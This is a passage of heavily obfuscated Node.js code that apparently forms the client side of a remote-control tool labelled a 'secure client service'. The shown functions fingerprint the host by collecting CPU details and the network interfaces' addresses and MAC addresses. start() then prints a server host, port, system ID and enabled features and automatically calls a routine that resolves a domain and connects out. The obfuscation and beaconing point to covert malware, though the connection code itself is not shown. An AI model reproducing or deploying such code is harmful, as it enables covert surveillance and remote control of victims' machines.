_0x515a6b=0x64-Math[_0x4fb2b6(0x1b5)](0x64*_0x172f8a/_0x1d6015);return{'usage':_0x515a6b,'cores':_0x1d6498[_0x4fb2b6(0xd4)],'model':_0x1d6498[0x0][_0x4fb2b6(0x184)]};}catch(_0x1e17d7){return{'usage':0x0,'cores':0x0,'model':_0x4fb2b6(0xe8)};}}function _0x3f04(_0x438aff,_0x9ce345){const _0x1a821d=_0x1a82();return _0x3f04=function(_0x3f0415,_0x50d3de){_0x3f0415=_0x3f0415-0xae;let _0x4a6c9c=_0x1a821d[_0x3f0415];return _0x4a6c9c;},_0x3f04(_0x438aff,_0x9ce345);}function getNetworkStats(){const _0x12bdc4=_0x1bbf8f;try{const _0x70d3fc=os[_0x12bdc4(0x222)](),_0x440baa=[];return Object['keys'](_0x70d3fc)['forEach'](_0x49a419=>{const _0x3fd3b7=_0x12bdc4;_0x70d3fc[_0x49a419][_0x3fd3b7(0x153)](_0x5ca2f6=>{const _0x425e9b=_0x3fd3b7;!_0x5ca2f6[_0x425e9b(0x169)]&&_0x5ca2f6[_0x425e9b(0x1a3)]===_0x425e9b(0x167)&&_0x440baa[_0x425e9b(0xb1)]({'name':_0x49a419,'address':_0x5ca2f6['address'],'netmask':_0x5ca2f6[_0x425e9b(0x114)],'mac':_0x5ca2f6[_0x425e9b(0x1d7)]});});}),_0x440baa;}catch(_0x1b17cb){return[];}}function getDiskStats(){const _0x5595cc=_0x1bbf8f;try{return{'available':_0x5595cc(0x202),'used':_0x5595cc(0x202),'total':_0x5595cc(0x202)};}catch(_0x3df61b){return{'available':_0x5595cc(0x202),'used':'N/A','total':_0x5595cc(0x202)};}}function getTopProcesses(_0x39af=0x5){const _0x37cced=_0x1bbf8f;try{return[{'name':_0x37cced(0x165),'pid':0x0,'cpu':0x0,'memory':0x0}];}catch(_0x405092){return[];}}function start(){const _0x547799=_0x1bbf8f;logMessage('Starting\x20secure\x20client\x20service...'),console[_0x547799(0x131)](_0x547799(0x1ef)+config[_0x547799(0x156)]+':'+config['serverPort']),console[_0x547799(0x131)]('[*]\x20System\x20ID:\x20'+config[_0x547799(0x1c0)]['id']),console['log']('[*]\x20Platform:\x20'+config[_0x547799(0x1c0)][_0x547799(0x11a)]+'\x20('+config['systemInfo'][_0x547799(0x12c)]+')'),console[_0x547799(0x131)](_0x547799(0x19b)+(config[_0x547799(0x11f)]?_0x547799(0x110):_0x547799(0x16c))),console[_0x547799(0x131)](_0x547799(0xc0)+Object[_0x547799(0x1de)](config[_0x547799(0x20a)])['filter'](([_0x16aff0,_0x891aae])=>_0x891aae)[_0x547799(0xcd)](([_0x49f553])=>_0x49f553)[_0x547799(0xec)](',\x20')),console['log']('[*]\x20Log\x20file:\x20'+(config[_0x547799(0x19f)]?config[_0x547799(0xb4)]:_0x547799(0x16c))),setTimeout(()=>{resolveDomainAndConnect();},0x3e8);}require[_0x1bbf8f(0x180)]===module&&start();module['exports']={'start':start,'config':config};